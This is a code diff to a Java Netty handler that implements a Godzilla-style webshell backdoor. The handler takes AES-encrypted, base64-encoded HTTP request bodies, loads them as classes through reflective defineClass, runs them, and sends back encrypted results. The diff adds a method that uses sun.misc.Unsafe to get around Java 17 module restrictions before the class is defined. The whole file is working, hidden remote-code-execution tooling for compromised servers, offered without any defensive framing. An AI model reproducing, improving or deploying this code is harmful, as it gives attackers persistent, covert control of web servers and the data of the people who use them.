@@ -32,23 +32,6 @@ public class GodzillaNettyHandler extends ChannelDuplexHandler {
     private HttpRequest request;
     private static Class<?> payload;
 
-    private static Class<?> defineClass(byte[] bytes) throws Exception {
-        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
-        Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
-        method.setAccessible(true);
-        return (Class<?>) method.invoke(urlClassLoader, bytes, 0, bytes.length);
-    }
-
-    public byte[] x(byte[] s, boolean m) {
-        try {
-            Cipher c = Cipher.getInstance("AES");
-            c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
-            return c.doFinal(s);
-        } catch (Exception e) {
-            return null;
-        }
-    }
-
     @Override
     public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
         if (msg instanceof HttpRequest) {
@@ -80,7 +63,7 @@ public class GodzillaNettyHandler extends ChannelDuplexHandler {
                     requestBody.setLength(0);
                     byte[] data = x(base64Decode(base64Str), false);
                     if (payload == null) {
-                        payload = defineClass(data);
+                        payload = reflectionDefineClass(data);
                         send(ctx, "");
                         return;
                     } else {
@@ -92,10 +75,49 @@ public class GodzillaNettyHandler extends ChannelDuplexHandler {
                         send(ctx, md5.substring(0, 16) + base64Encode(x(arrOut.toByteArray(), true)) + md5.substring(16));
                     }
                     return;
-                } catch (Exception ignored) {
+                } catch (Throwable e) {
+                    e.printStackTrace();
                 }
             }
             ctx.fireChannelRead(msg);
+        }
+    }
+
+    public Class<?> reflectionDefineClass(byte[] classBytes) throws Exception {
+        Object unsafe = null;
+        Object rawModule = null;
+        long offset = 48;
+        Method getAndSetObjectM = null;
+        try {
+            Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
+            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
+            unsafeField.setAccessible(true);
+            unsafe = unsafeField.get(null);
+            rawModule = Class.class.getMethod("getModule").invoke(this.getClass(), (Object[]) null);
+            Object module = Class.class.getMethod("getModule").invoke(Object.class, (Object[]) null);
+            Method objectFieldOffsetM = unsafe.getClass().getMethod("objectFieldOffset", Field.class);
+            offset = (Long) objectFieldOffsetM.invoke(unsafe, Class.class.getDeclaredField("module"));
+            getAndSetObjectM = unsafe.getClass().getMethod("getAndSetObject", Object.class, long.class, Object.class);
+            getAndSetObjectM.invoke(unsafe, this.getClass(), offset, module);
+        } catch (Throwable ignored) {
+        }
+        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
+        Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
+        defMethod.setAccessible(true);
+        Class<?> clazz = (Class<?>) defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
+        if (getAndSetObjectM != null) {
+            getAndSetObjectM.invoke(unsafe, this.getClass(), offset, rawModule);
+        }
+        return clazz;
+    }
+
+    public byte[] x(byte[] s, boolean m) {
+        try {
+            Cipher c = Cipher.getInstance("AES");
+            c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
+            return c.doFinal(s);
+        } catch (Exception e) {
+            return null;
         }
     }
 
@@ -108,18 +130,15 @@ public class GodzillaNettyHandler extends ChannelDuplexHandler {
             Object encoder = base64.getMethod("getEncoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
             value = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
         } catch (Exception var6) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Encoder");
-                Object encoder = base64.newInstance();
-                value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
-            } catch (Exception ignored) {
-            }
+            base64 = Class.forName("sun.misc.BASE64Encoder");
+            Object encoder = base64.newInstance();
+            value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
         }
         return value;
     }
 
     @SuppressWarnings("all")
-    public static byte[] base64Decode(String bs) {
+    public static byte[] base64Decode(String bs) throws Exception {
         byte[] value = null;
         Class<?> base64;
         try {
@@ -127,12 +146,9 @@ public class GodzillaNettyHandler extends ChannelDuplexHandler {
             Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
             value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
         } catch (Exception var6) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Decoder");
-                Object decoder = base64.newInstance();
-                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
-            } catch (Exception ignored) {
-            }
+            base64 = Class.forName("sun.misc.BASE64Decoder");
+            Object decoder = base64.newInstance();
+            value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
         }
         return value;
     }
@@ -142,21 +158,5 @@ public class GodzillaNettyHandler extends ChannelDuplexHandler {
         response.headers().set("Content-Type", "text/plain; charset=UTF-8");
         response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());
         ctx.channel().writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);
-    }
-
-    static {
-        // webflux3 jdk17 bypass module
-        try {
-            Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
-            java.lang.reflect.Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
-            unsafeField.setAccessible(true);
-            Object unsafe = unsafeField.get(null);
-            Object module = Class.class.getMethod("getModule").invoke(Object.class, (Object[]) null);
-            java.lang.reflect.Method objectFieldOffsetM = unsafe.getClass().getMethod("objectFieldOffset", Field.class);
-            Long offset = (Long) objectFieldOffsetM.invoke(unsafe, Class.class.getDeclaredField("module"));
-            java.lang.reflect.Method getAndSetObjectM = unsafe.getClass().getMethod("getAndSetObject", Object.class, long.class, Object.class);
-            getAndSetObjectM.invoke(unsafe, GodzillaNettyHandler.class, offset, module);
-        } catch (Exception ignored) {
-        }
     }
 }
